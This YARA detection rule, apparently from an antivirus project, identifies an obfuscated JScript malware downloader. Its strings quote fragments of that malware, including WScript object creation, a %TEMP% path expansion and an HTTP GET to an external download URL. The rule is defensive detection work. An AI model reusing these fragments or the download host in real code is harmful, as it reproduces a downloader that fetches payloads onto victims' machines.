rule sig_20160428_00009d2fed95c2e694ba03fdb03f2ba8 {
  meta:
    description = "datamaliciousorder - file 20160428_00009d2fed95c2e694ba03fdb03f2ba8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2725e4b9cdb79d4fe1f6278ef4a3bf985113863982768f0afbf2fdb044a3dd7f"

  strings:
    $s1  = "function JsgGkzIxnGgvSgiLzkEkj(CuoUxfVekOljGjjOfpFbd){MrjJflCmxMddVayUglCqi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function JsgGkzIxnGgvSgiLzkEkj(CuoUxfVekOljGjjOfpFbd){MrjJflCmxMddVayUglCqi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function GmbAujCsiGdvImbVznSsj() {return MrjJflCmxMddVayUglCqi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return FypJdiQdtIayWvzSsjWqt - OmhKsuApnMhrTxvUsbUqu;};" fullword ascii
    $s5  = "var MrjJflCmxMddVayUglCqi = function SbyAprAdiSrpKmdMrfRwp() {return KghEyfCruJcnLbcVbfYho[ReoZlbJpbFliMfeGsbCmf](\"WScript\"+\"" ascii
    $s6  = "function BikLbkFdpQwxRjeYanRgz(FypJdiQdtIayWvzSsjWqt, OmhKsuApnMhrTxvUsbUqu){LadErhUqwHseVxqMecOio = LadErhUqwHseVxqMecOio * 1; " ascii
    $s7  = "var MrjJflCmxMddVayUglCqi = function SbyAprAdiSrpKmdMrfRwp() {return KghEyfCruJcnLbcVbfYho[ReoZlbJpbFliMfeGsbCmf](\"WScript\"+\"" ascii
    $s8  = "var KghEyfCruJcnLbcVbfYho = this[\"WScript\"];" fullword ascii
    $s9  = "function GmbAujCsiGdvImbVznSsj() {return MrjJflCmxMddVayUglCqi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function PhoYbxRnlQmyEsgUssUim(){return NjmWxzLiwGwsSkhNsbEre + \"\";};" fullword ascii
    $s11 = "function BikLbkFdpQwxRjeYanRgz(FypJdiQdtIayWvzSsjWqt, OmhKsuApnMhrTxvUsbUqu){LadErhUqwHseVxqMecOio = LadErhUqwHseVxqMecOio * 1; " ascii
    $s12 = "AbkGccAnmZlfXtaTtmHgn[VypVwoHlpOmaWxbSdlEdj](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s13 = "function GbqOueJhiVheLqjGzpGhr() {return ((QixPloXqeJatQonBzfYsz == true) && (QixPloXqeJatQonBzfYsz == EpmHukKaiXhtGniBjlWdh)) ?" ascii
    $s14 = "function GbqOueJhiVheLqjGzpGhr() {return ((QixPloXqeJatQonBzfYsz == true) && (QixPloXqeJatQonBzfYsz == EpmHukKaiXhtGniBjlWdh)) ?" ascii
    $s15 = "var EpmHukKaiXhtGniBjlWdh = false;" fullword ascii
    $s16 = "return BikLbkFdpQwxRjeYanRgz(1 == 1 ? IfsSasVasZxxOltHpaFua : 0, 1 == 1 ? HokRxaXwzGvoYbsQnvQzw : 0);" fullword ascii
    $s17 = "}while (XtuWzuIdvIyqJhxTuuIxy);" fullword ascii
    $s18 = "function RqeWziWhpFoxHugJltTpp(){return 23;};" fullword ascii
    $s19 = "function YnnOoyNwuJzmVprGqbBdz(LcjUikKpkAxqGvqTwhSzt) {var ElwJogXmvVqkJnuFsdUvy = (1, 2, 3, 4, 5, LcjUikKpkAxqGvqTwhSzt); retur" ascii
    $s20 = "function YnnOoyNwuJzmVprGqbBdz(LcjUikKpkAxqGvqTwhSzt) {var ElwJogXmvVqkJnuFsdUvy = (1, 2, 3, 4, 5, LcjUikKpkAxqGvqTwhSzt); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}